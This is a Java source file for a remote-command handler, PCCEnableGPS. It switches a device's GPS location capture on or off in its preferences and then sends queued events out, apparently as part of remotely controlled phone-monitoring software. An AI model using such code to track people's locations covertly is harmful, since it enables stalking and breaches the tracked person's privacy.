package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCEnableGPS extends PCCRmtCmdAsync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private int mode = 0;
	
	public PCCEnableGPS(int mode) {
		this.mode = mode;		
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.ENABLE_LOCATION.getId());
		try {
			Preference pref = Global.getPreference();
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			gps.setEnabled(true);
			if (mode == DISABLE) {
				gps.setEnabled(false);
			} 
			pref.commit(gps);
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOC_NOT_SUPPORTED);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
